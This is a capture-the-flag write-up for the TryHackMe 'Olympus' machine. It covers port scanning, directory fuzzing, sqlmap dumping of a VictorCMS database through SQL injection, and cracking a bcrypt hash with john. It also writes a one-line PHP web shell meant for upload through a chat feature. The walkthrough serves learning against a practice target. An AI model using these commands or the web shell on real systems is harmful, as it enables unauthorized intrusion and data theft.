# THM-Olympus-CTF


```bash
root@ip-10-10-230-85:~# rustscan -a 10.10.182.192 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time \u231b

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.182.192:22
Open 10.10.182.192:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Ennumeration
```bash
echo "10.10.27.68 olympus.thm" >> /etc/hosts
```
![image](https://user-images.githubusercontent.com/90036439/223972505-ab22dc4d-99b4-4295-96e5-7d3ec9145d5a.png)


```bash
root@ip-10-10-70-200:~# ffuf -u http://olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10]
:: Progress: [4655/4655] :: Job [1/1] :: 33790 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/90036439/223973205-ac9467ee-8ca2-43be-906c-0b69d4c14fcf.png)
![image](https://user-images.githubusercontent.com/90036439/223974836-e8de8d9a-c3f8-43d0-91da-08e3753e8d06.png)

```bash
root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dbs

[...]

[09:17:14] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

```

```bash
root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus
```
![image](https://user-images.githubusercontent.com/90036439/223977555-baf68ac5-5e32-4d50-b2c7-c0ea7013e61a.png)
```bash
root@ip-10-10-70-200:~# john promotheus.hash -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s[.........]e       (?)
1g 0:00:06:29 DONE (2023-03-09 09:30) 0.002569g/s 10.31p/s 10.31c/s 10.31C/s 19861986..543210
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
![image](https://user-images.githubusercontent.com/90036439/223977977-be6d630d-dd90-4e56-80cf-56c1de2884c3.png)

![image](https://user-images.githubusercontent.com/90036439/223983373-552684f7-5e73-4b54-ba76-ff0d0c38858a.png)

![image](https://user-images.githubusercontent.com/90036439/223985036-95de1514-234a-4bfb-8717-edfccd387bd5.png)

Let's put together what we know. The IT guy made sure that the files that are sent to the server via chat have a random name. We also know that all messages are stored in the database including the files we send.

```bash
root@ip-10-10-70-200:~# cat totalyNotEvileFile.php 
<?php system($_GET["cmd"]); ?>
root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus -T chats --fresh-queries 
```
![image](https://user-images.githubusercontent.com/90036439/223987707-10423bfa-ffa9-4365-9aff-9e3763597f1d.png)

```bash
root@ip-10-10-70-200:~# ffuf -u http://chat.olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://chat.olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 325, Words: 20, Lines: 10]
phpmyadmin              [Status: 403, Size: 281, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]
static                  [Status: 301, Size: 321, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: [4655/4655] :: Job [1/1] :: 11317 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
![image](https://user-images.githubusercontent.com/90036439/223988276-0a0779ab-2cfd-4b1e-a09f-c56f732dd54c.png)

